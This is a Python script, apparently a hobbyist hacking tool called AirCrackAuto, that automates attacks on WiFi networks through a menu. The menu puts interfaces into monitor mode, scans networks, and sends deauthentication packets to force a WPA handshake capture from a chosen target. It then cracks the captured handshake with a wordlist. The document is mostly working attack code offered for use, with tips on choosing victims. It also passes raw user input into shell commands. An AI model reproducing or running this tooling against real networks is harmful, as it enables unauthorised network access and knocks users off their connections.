
# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
from subprocess import check_call
from sys import argv
from genericpath import isfile
from traceback import print_tb
from pystyle import *
cmd  = os.system("clear")


lucifer = r'''
    BY :
 ▄█       ███    █▄   ▄████████  ▄█     ▄████████    ▄████████    ▄████████ 
███       ███    ███ ███    ███ ███    ███    ███   ███    ███   ███    ███ 
███       ███    ███ ███    █▀  ███▌   ███    █▀    ███    █▀    ███    ███ 
███       ███    ███ ███        ███▌  ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███       ███    ███ ███        ███▌ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███       ███    ███ ███    █▄  ███    ███          ███    █▄  ▀███████████ 
███▌    ▄ ███    ███ ███    ███ ███    ███          ███    ███   ███    ███ 
█████▄▄██ ████████▀  ████████▀  █▀     ███          ██████████   ███    ███ 
▀                                                                ███    ███ 

		     instagram.com/0x1ucif3r
                                                    
 
'''

System.Size(140, 40)
System.Title("AirCrackAuto")
System.Clear()
Anime.Fade(Center.Center(lucifer), Colors.red_to_green, Colorate.Vertical, interval=0.025, enter=True)



def intro():
    cmd  = os.system("clear")
    print("""\033[1;32m


 ▄▄▄       ██▓ ██▀███   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
▒████▄    ▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██  ▀█▄  ▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██▄▄▄▄██ ░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
 ▓█   ▓██▒░██░░██▓ ▒██▒▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒▒   ▓▒█░░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
  ▒   ▒▒ ░ ▒ ░  ░▒ ░ ▒░  ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
  ░   ▒    ▒ ░  ░░   ░ ░          ░░   ░   ░   ▒   ░        ░ ░░ ░ 
      ░  ░ ░     ░     ░ ░         ░           ░  ░░ ░      ░  ░    V2.0
                       ░                           ░               

             A Automate script for wifi hacking.
              
  {!}--------------{+} Coded By 1ucif3r {+}--------------{!}
                                                             
  [1]-->Start monitor mode       
  [2]-->Stop monitor mode                        
  [3]-->Scan Networks                            
  [4]-->Getting Handshake(Need Monitor mode)                      
  [5]-->Crack Handshake with wordlist(Handshake needed)                                     

  [0]-->About Me
  [00]-->Exit

""")
    print(f'''\x1b[38;2;245;2;2m[root@aircrackauto] ''')
    var = int(input(""))
    if var == 1 :
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 2 :
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        intro()
    elif var == 3 :
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
        intro()
    elif var == 4 :
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
        intro()
    
    elif var == 0 :
        cmd = os.system("clear")
        print("""
              

 ██ ██    ██  ██████ ██ ███████ ██████  ██████  
███ ██    ██ ██      ██ ██           ██ ██   ██ 
 ██ ██    ██ ██      ██ █████    █████  ██████  
 ██ ██    ██ ██      ██ ██           ██ ██   ██ 
 ██  ██████   ██████ ██ ██      ██████  ██   ██ 
                                                
                                                              
Instagram : https://www.instagram.com/0x1ucif3r/
Website : https://1ucif3r.me/
Github : https://github.com/1ucif3r
DARK4RMY : https://dark4rmy.in/

""")
        quit()
    elif var == 00:
        exit()
    
    elif var == 5 :
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()
    
    
    else:
        print("Not Found")
        cmd = os.system("sleep 2")
        intro()
intro()